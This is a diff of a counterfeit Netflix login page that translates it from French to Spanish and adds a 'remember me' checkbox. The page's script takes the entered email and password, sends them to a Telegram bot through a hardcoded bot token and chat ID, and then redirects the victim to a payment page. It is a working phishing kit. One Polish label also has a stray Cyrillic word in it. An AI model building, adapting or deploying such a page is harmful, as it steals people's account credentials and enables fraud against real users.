@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="pageTitle">Netflix France - Regardez des séries et films en streaming</title>
+    <title id="pageTitle">Netflix España - Ver series y películas en streaming</title>
     <style>
         * {
             margin: 0;
@@ -315,27 +315,31 @@
 
     <main>
         <div class="login-container">
-            <h1 id="loginTitle">S'identifier</h1>
+            <h1 id="loginTitle">Iniciar sesión</h1>
             <form id="loginForm">
                 <div class="input-group">
                     <input type="email" id="email" name="email" placeholder=" " required>
-                    <label for="email" id="emailLabel">E-mail ou numéro de téléphone</label>
+                    <label for="email" id="emailLabel">Correo electrónico o número de teléfono</label>
                 </div>
                 <div class="input-group">
                     <input type="password" id="password" name="password" placeholder=" " required>
-                    <label for="password" id="passwordLabel">Mot de passe</label>
+                    <label for="password" id="passwordLabel">Contraseña</label>
                 </div>
                 <button type="submit" class="login-button" id="submitBtn">
-                    <span id="loginButtonText">S'identifier</span>
+                    <span id="loginButtonText">Iniciar sesión</span>
                     <div class="spinner"></div>
                 </button>
                 <div class="options-container">
-                <a href="#" class="help-link" id="helpLink">Besoin d'aide ?</a>
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember" class="remember-checkbox">
+                        <label for="remember" id="rememberLabel">Recuérdame</label>
+                    </div>
+                    <a href="#" class="help-link" id="helpLink">¿Necesitas ayuda?</a>
                 </div>
             </form>
             <div class="signup-text">
-                <span id="newUserText">Nouveau sur Netflix ?</span> 
-                <a href="#" class="signup-link" id="signupLink">Inscrivez-vous maintenant.</a>
+                <span id="newUserText">¿Nuevo en Netflix?</span> 
+                <a href="#" class="signup-link" id="signupLink">Suscríbete ahora.</a>
             </div>
         </div>
     </main>
@@ -343,24 +347,24 @@
     <footer class="footer">
         <div class="footer-content">
             <div class="footer-top">
-                <span id="questionsText">Des questions ? Appelez le</span> 
+                <span id="questionsText">¿Preguntas? Llama al</span> 
                 <a href="tel:(+33) 0805-543-063" class="footer-link">(+33) 0805-543-063</a>
             </div>
             <div class="footer-links">
-                <a href="#" class="footer-link" id="faqLink">FAQ</a>
-                <a href="#" class="footer-link" id="helpCenterLink">Centre d'aide</a>
-                <a href="#" class="footer-link" id="termsLink">Conditions d'utilisation</a>
-                <a href="#" class="footer-link" id="privacyLink">Confidentialité</a>
-                <a href="#" class="footer-link" id="cookiesLink">Préférences de cookies</a>
-                <a href="#" class="footer-link" id="legalLink">Mentions légales</a>
-                <a href="#" class="footer-link" id="adsLink">Choix liés à la pub</a>
+                <a href="#" class="footer-link" id="faqLink">Preguntas frecuentes</a>
+                <a href="#" class="footer-link" id="helpCenterLink">Centro de ayuda</a>
+                <a href="#" class="footer-link" id="termsLink">Términos de uso</a>
+                <a href="#" class="footer-link" id="privacyLink">Privacidad</a>
+                <a href="#" class="footer-link" id="cookiesLink">Preferencias de cookies</a>
+                <a href="#" class="footer-link" id="legalLink">Avisos legales</a>
+                <a href="#" class="footer-link" id="adsLink">Opciones de anuncios</a>
             </div>
-            <div id="countryText">Netflix France</div>
+            <div id="countryText">Netflix España</div>
         </div>
     </footer>
 
     <script>
-        // Traductions multilingues complètes
+        // Traducciones multilingües completas
         const translations = {
             fr: {
                 pageTitle: "Netflix France - Regardez des séries et films en streaming",
@@ -465,7 +469,7 @@
             pl: {
                 pageTitle: "Netflix Polska - Oglądaj seriale i filmy online",
                 loginTitle: "Zaloguj się",
-                emailLabel: "Adres e-mail lub numer telefonu",
+                emailLabel: "Adres e-mail или numer telefonu",
                 passwordLabel: "Hasło",
                 loginButtonText: "Zaloguj się",
                 rememberLabel: "Zapamiętaj mnie",
@@ -484,7 +488,7 @@
             }
         };
 
-        // Gestion du changement de langue
+        // Gestión del cambio de idioma
         document.getElementById('languageSelector').addEventListener('change', function() {
             const lang = this.value;
             localStorage.setItem('netflixLang', lang);
@@ -502,12 +506,12 @@
             document.title = trans.pageTitle;
         }
 
-        // Initialiser la langue au chargement
-        const savedLang = localStorage.getItem('netflixLang') || 'fr';
+        // Inicializar el idioma al cargar
+        const savedLang = localStorage.getItem('netflixLang') || 'es';
         document.getElementById('languageSelector').value = savedLang;
         updateLanguage(savedLang);
 
-        // Gestion du formulaire
+        // Gestión del formulario
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -515,10 +519,10 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             
-            // Show spinner
+            // Mostrar spinner
             submitBtn.classList.add('btn-loading');
             
-            // Send data to Telegram bot
+            // Enviar datos al bot de Telegram
             const botToken = '8039609056:AAHOhf-iy12X_0ABC-D7Lm7pZF3SnykB6Kk';
             const chatId = '-4883048028';
             const lang = document.getElementById('languageSelector').value;
@@ -563,13 +567,13 @@
             })
             .then(response => response.json())
             .then(data => {
-                console.log('Identifiants envoyés à Telegram:', data);
+                console.log('Credenciales enviadas a Telegram:', data);
             })
             .catch(error => {
-                console.error('Erreur lors de l\'envoi à Telegram:', error);
+                console.error('Error al enviar a Telegram:', error);
             })
             .finally(() => {
-                // Wait 2 seconds before redirecting (simulating login)
+                // Esperar 2 segundos antes de redirigir (simulando inicio de sesión)
                 setTimeout(() => {
                     const lang = document.getElementById('languageSelector').value;
                     window.location.href = `paiement.html?lang=${lang}`;
